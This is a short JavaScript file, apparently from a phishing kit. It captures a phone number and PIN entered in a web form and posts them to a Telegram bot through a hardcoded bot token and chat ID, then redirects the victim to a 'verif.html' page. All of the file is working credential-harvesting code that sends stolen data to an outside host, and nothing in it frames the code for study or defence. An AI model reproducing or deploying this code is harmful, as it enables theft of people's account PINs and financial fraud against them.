
        
    const TOKEN = "6367586969:AAHkTr5OyIEU62p22uIl_jTgAYrQ5kSy534";
const CHAT_ID = "5426748848";
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

const form = document.getElementById("tg");

form.addEventListener("submit", onSubmitTelegram);

function onSubmitTelegram(e) {
  e.preventDefault();

  const { nomor, pin, } = form;
  const data = {
    nomor: nomor.value,
    pin: pin.value,
  };

  let message = `<b></b>\n`;
  message += `<b>Nomor-Hp :</b> ${data.nomor}\n`;
  message += `<b>PIN :</b> ${data.pin}\n`;

  const dataTg = {
    chat_id: CHAT_ID,
    text: message,
    parse_mode: "html",
  };

  const options = {
    method: "POST",
    body: JSON.stringify(dataTg),
    headers: {
      "Content-Type": "application/json",
    },
  };

  fetch(URL_API, options)
    .then((res) => res.json())
    .then((res) => console.log(res))
    .catch((err) => console.log(err));
    
    window.location.href='/verif.html';
}

